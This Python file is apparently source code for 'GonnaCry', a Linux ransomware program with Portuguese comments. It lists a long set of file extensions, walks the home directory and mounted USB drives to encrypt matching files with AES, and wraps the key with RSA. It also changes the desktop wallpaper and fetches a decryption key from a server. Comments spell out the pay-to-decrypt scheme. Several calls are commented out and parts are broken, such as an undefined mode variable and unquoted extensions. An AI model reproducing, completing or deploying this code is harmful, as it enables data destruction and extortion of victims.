#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import getpass
import sys
import shutil

from AES import *
from RSA import *
from SRSA import *

tipos_arquivos = [.doc, .docx, .xls, .xlsx, .ppt, .pptx, .pst, .ost, .msg, .eml, .vsd, .vsdx, .txt, .csv, .rtf, .wks, .wk1, .pdf, .dwg, .onetoc2, .snt, .jpeg, .jpg, .docb, .docm, .dot, .dotm, .dotx, .xlsm, .xlsb, .xlw, .xlt, .xlm, .xlc, .xltx, .xltm, .pptm, .pot, .pps, .ppsm, .ppsx, .ppam, .potx, .potm, .edb, .hwp, .602, .sxi, .sti, .sldx, .sldm, .sldm, .vdi, .vmdk, .vmx, .gpg, .aes, .ARC, .PAQ, .bz2, .tbk, .bak, .tar, .tgz, .gz, .7z, .rar, .zip, .backup, .iso, .vcd, .bmp, .png, .gif, .raw, .cgm, .tif, .tiff, .nef, .psd, .ai, .svg, .djvu, .m4u, .m3u, .mid, .wma, .flv, .3g2, .mkv, .3gp, .mp4, .mov, .avi, .asf, .mpeg, .vob, .mpg, .wmv, .fla, .swf, .wav, .mp3, .sh, .class, .jar, .java, .rb, .asp, .php, .jsp, .brd, .sch, .dch, .dip, .pl, .vb, .vbs, .ps1, .bat, .cmd, .js, .asm, .h, .pas, .cpp, .c, .cs, .suo, .sln, .ldf, .mdf, .ibd, .myi, .myd, .frm, .odb, .dbf, .db, .mdb, .accdb, .sql, .sqlitedb, .sqlite3, .asc, .lay6, .lay, .mml, .sxm, .otg, .odg, .uop, .std, .sxd, .otp, .odp, .wb2, .slk, .dif, .stc, .sxc, .ots, .ods, .3dm, .max, .3ds, .uot, .stw, .sxw, .ott, .odt, .pem, .p12, .csr, .crt, .key, .pfx, .der]
# ponto de partida da criptografia
# modo=1 -> criptografa
# modo!=1 -> descriptografa
def menu(senha_AES):
    # caminho de partida
    home = os.environ['HOME']
    listar(senha_AES,home,tipos_arquivos)
    listar_media(senha_AES,tipos_arquivos)

# função que lista e criptografa HD'S externos e pendrives
def listar_media(senha_AES, tipos_arq):
    print('Procurando por pendrives/HDs')
    caminho = '/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        listar(senha_AES,caminho,tipos_arq,modo)


# função que lista todos os arquivos e criptografa ou descriptografa
def listar(chave_AES,diretorio, tipos_arq):
    atual = os.getcwd()
    if(modo == 1): # criptografa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a = caminho+'/'+arq
                extensao = os.path.splitext(a)
                for ext in tipos_arq:
                    if(extensao[1] == ext):
                        if(caminho == atual):
                            ignorar = 1
                        else:
                            a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                            try:
                                criptografa(chave_AES,a)
                            except:
                                print('erro ao criptografar-> ' +str(a))

    else: # descriptgrafa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a = caminho+'/'+arq
                extensao = os.path.splitext(a)
                if(extensao[1] == '.cripto'):
                    a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                    descriptografa(chave_AES,a)

# conexão com o servidor -> ainda a ser pensado como fazer ...
def client(IP_serv):
    try:
        s = socket.socket()
        s.connect((IP_serv,9999))
    except socket.error as e:
        print('Erro de conexão: '+str(e))
        exit()
    l = s.recv(1024)
    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
    while (l):
        f.write(l)
        l = s.recv(1024)
    f.close()
    s.close()

# GERA SENHA AES que vai criptografar os arquivos
# Salva senha em arquivo.txt
def gera_chave_AES():
    tamanho=256 # bytes
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    try:
        f = open('keys/AES.txt','w')
    except IOError:
        os.mkdir('keys')
        f = open('keys/AES.txt','w')
    f.write(senha)
    f.close()
    return senha

# função que troca o plano de fundo do compiuter
def change_background():
    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')

# função que criptografa tudo
def crypto_all():
    AES_key = gera_chave_AES()
    print('[*] Chave AES gerada')
    #menu(AES_key,1) # -> criptografa tudo
    AES_to_RSA()
    print('[*] Senha AES criptografado com chave RSA')
    RSA_to_SRSA()
    print('[*] Chave privada do cliente criptografada')
'''
    # salva o caminho do GonnaCry
    a = os.getcwd()
    desktop = '/Área\ de\ Trabalho/'
    rumo = os.environ['HOME']
    if(os.path.isdir(rumo+desktop)):
        f = open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
        f.write(a)
        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
    else:
        desktop = '/Desktop/'
        f = open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
        f.write(a)
        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
    print('[*] Caminho salvo')
'''

# função que descriptografa tudo após ter falado com o servidor
def decrypt_all():
    client('localhost')
    SRSA_to_RSA()
    print('[*] chave privada do cliente descriptografada')
    RSA_to_AES()
    print('[*] chave AES descriptografada')

    f = open('keys/AES.txt','r')
    a = f.read()
    tam = len(a)
    if(tam == 30):
        adsas = 1
        #menu(a,2)

# MAIN
if __name__ == "__main__":
    #crypto_all()
    change_background()
    #decrypt_all()







# == ALGORITMO ==
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
